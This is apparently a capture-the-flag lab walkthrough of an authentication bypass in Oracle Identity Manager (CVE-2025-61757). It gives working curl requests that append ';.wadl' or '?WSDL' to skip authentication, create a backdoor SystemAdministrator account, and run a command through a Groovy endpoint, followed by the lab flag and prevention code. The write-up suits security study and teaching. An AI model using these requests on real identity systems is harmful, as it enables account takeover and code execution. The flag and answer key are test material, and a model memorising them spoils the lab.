# Solution Walkthrough - CVE-2025-61757

## Challenge Analysis

### Reconnaissance

1. **Access the application**:
   ```
   http://localhost:14000
   ```
   You'll see Oracle Identity Manager login page.

2. **Check the API info endpoint**:
   ```bash
   curl http://localhost:14000/identity/rest/v1/info
   ```
   
   Response:
   ```json
   {
     "product": "Oracle Identity Manager",
     "version": "12.2.1.4.0",
     "component": "REST WebServices"
   }
   ```

3. **Try accessing protected endpoint**:
   ```bash
   curl http://localhost:14000/identity/rest/v1/users
   ```
   
   Response: `401 Unauthorized`

### Vulnerability Discovery

The version 12.2.1.4.0 is vulnerable to CVE-2025-61757. Research shows:
- Authentication bypass via URI manipulation
- Matrix parameters (`;.wadl`) and query parameters (`?WSDL`) bypass SecurityFilter

### Exploitation

#### Attack Vector 1: WADL Bypass

```bash
curl http://localhost:14000/identity/rest/v1/users;.wadl
```

**Why it works**:
- The SecurityFilter uses regex to match `.*\.wadl$`
- Path becomes: `/identity/rest/v1/users;.wadl`
- Regex matches `.wadl` at the end
- Request is treated as public, bypassing authentication

#### Attack Vector 2: WSDL Bypass

```bash
curl "http://localhost:14000/identity/rest/v1/users?WSDL"
```

**Why it works**:
- Query parameter `?WSDL` is appended to URI
- Filter checks full URI including query string
- Regex pattern `.*\.wsdl$` matches (case-insensitive)

### Privilege Escalation

Create admin user via bypassed endpoint:

```bash
curl -X POST "http://localhost:14000/identity/rest/v1/users?WSDL" \
  -H "Content-Type: application/json" \
  -d '{
    "userLogin": "pwned",
    "password": "Hacked123!",
    "firstName": "Pwned",
    "lastName": "User",
    "role": "SystemAdministrator",
    "email": "pwned@evil.com"
  }'
```

Response:
```json
{
  "status": "success",
  "userLogin": "pwned",
  "role": "SystemAdministrator",
  "usr_key": "2"
}
```

### Remote Code Execution

Access Groovy compilation endpoint:

```bash
curl -X POST "http://localhost:14000/iam/governance/applicationmanagement/api/v1/applications/groovyscriptstatus;.wadl" \
  -H "Content-Type: application/json" \
  -d '{"script": "cat /flag.txt"}'
```

Response:
```json
{
  "status": "compiled",
  "output": "FLAG{CVE_2025_61757_0r4cl3_1d3nt1ty_pwn3d}\n"
}
```

### Alternative: Web Login

1. Login with created user:
   - URL: `http://localhost:14000/login`
   - Username: `pwned`
   - Password: `Hacked123!`

2. View dashboard - flag is displayed for SystemAdministrator role

## Key Concepts

### 1. Regex-Based Authentication Bypass

**Vulnerable Pattern**:
```python
if re.search(r'.*\.wadl$', uri, re.IGNORECASE):
    return True  # Public endpoint
```

**Attack**:
- Original path: `/identity/rest/v1/users`
- With bypass: `/identity/rest/v1/users;.wadl`
- Regex matches, authentication bypassed

### 2. Matrix Parameters in URLs

Matrix parameters are part of URI path:
```
/path;param=value/segment
```

Example:
```
/identity/rest/v1/users;.wadl
                        ^^^^^^
                    Matrix parameter
```

Application routes to `/identity/rest/v1/users` but filter sees `.wadl`.

### 3. Query Parameters Bypass

Query parameters affect URI matching:
```
/path?query=value
```

Filter checks: `/path?query=value`  
Application routes to: `/path`

### 4. Java Filter Vulnerabilities

Common pattern in Java applications:
```java
String uri = request.getRequestURI() + "?" + request.getQueryString();
if (publicPattern.matches(uri)) {
    chain.doFilter(request, response);  // Bypass auth
}
```

## Prevention Techniques

### 1. Path-Based Authentication

```python
def security_filter():
    path = request.path  # Use only path, ignore query/matrix
    
    if path in PUBLIC_PATHS:
        return True
    return False
```

### 2. Route-Based Authorization

```python
@app.route('/api/users')
@require_role('admin')
def users():
    # Authorization at route level
    pass
```

### 3. Input Sanitization

```python
def clean_uri(uri):
    # Remove matrix parameters
    uri = re.sub(r';[^/]*', '', uri)
    # Remove query parameters
    uri = uri.split('?')[0]
    return uri
```

## Real-World Context

### Similar Vulnerabilities

1. **CVE-2021-35587** - Oracle Access Manager
2. **CVE-2024-XXXXX** - Various Java frameworks
3. Spring Security filter bypass issues

### Attack Scenarios

1. **Corporate Breach**: Attacker gains admin access to identity management
2. **Lateral Movement**: Use admin rights to access other systems
3. **Data Exfiltration**: Export all user credentials and permissions
4. **Persistence**: Create backdoor admin accounts

## Tools and Techniques

### Burp Suite Exploitation

1. Intercept request to protected endpoint
2. Add `;.wadl` to path or `?WSDL` to query
3. Forward modified request
4. Observe authentication bypass

### Automated Scanner Detection

```python
# Check for vulnerability
paths = ['/api/users', '/admin/panel']
bypasses = [';.wadl', ';.wsdl', '?WSDL', '?wsdl']

for path in paths:
    for bypass in bypasses:
        test_url = base_url + path + bypass
        if is_accessible(test_url):
            print(f"Vulnerable: {test_url}")
```

## Conclusion

CVE-2025-61757 demonstrates the danger of:
- Regex-based security filters
- URI manipulation techniques
- Missing authentication on critical functions

**Lessons Learned**:
1. Never rely solely on URI patterns for authentication
2. Implement defense in depth
3. Use framework-provided authentication mechanisms
4. Regular security audits and penetration testing

## Flag

```
FLAG{CVE_2025_61757_0r4cl3_1d3nt1ty_pwn3d}
```
